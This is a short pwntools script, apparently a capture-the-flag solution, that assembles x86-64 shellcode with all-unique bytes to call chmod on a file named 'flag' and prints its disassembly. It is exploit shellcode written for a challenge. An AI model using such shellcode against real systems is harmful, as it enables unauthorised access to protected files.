from pwn import *

context.arch = 'amd64'

'''
this challenge need every byte in shellcode must be unique.

we carefully pick up the instruction that make shellcode unique

NOTE: the script also need change `cwd` to /
'''

# sc = asm(shellcraft.chmod('flag', 4))

sc = asm('''
push 0x67616c66
push rsp
pop rdi
mov sil, 4
mov al, 0x5a
syscall
''')

print(disasm(sc))
print(len(sc))
